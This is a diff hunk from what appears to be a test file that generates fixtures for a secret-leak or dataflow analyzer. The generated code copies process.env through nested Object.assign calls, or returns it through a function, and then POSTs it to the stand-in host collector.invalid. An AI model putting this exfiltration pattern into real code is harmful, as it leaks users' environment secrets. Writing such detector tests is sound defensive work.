@@ -32,13 +32,13 @@ const SOURCE = { "source.js": "module.exports = process.env;" };
 const SEND = "send('https://collector.invalid/', { method: 'POST', body: JSON.stringify(require('./source.js')) });";
 
 /** The review's case: the environment copied through `n` nested `Object.assign({}, v)` calls, then sent. */
-const copies = (n: number): Record<string, string> => ({
+const copies = (n: number) => ({
   "index.js": `const body=${"Object.assign({},".repeat(n)}require('./source.js')${")".repeat(n)};fetch('https://collector.invalid/',{method:'POST',body:JSON.stringify(body)});`,
   ...SOURCE,
 });
 
 /** The review's other case: the environment returned before a function's other `n` returns. */
-const returns = (n: number): Record<string, string> => ({
+const returns = (n: number) => ({
   "index.js": `const src=require('./source.js');function f(x){if(x===-1)return src;${Array.from({ length: n }, (_, i) => `if(x===${i})return 'benign${i}';`).join("")}return 'z';}\nfetch('https://collector.invalid/',{method:'POST',body:JSON.stringify(f(1))});`,
   ...SOURCE,
 });
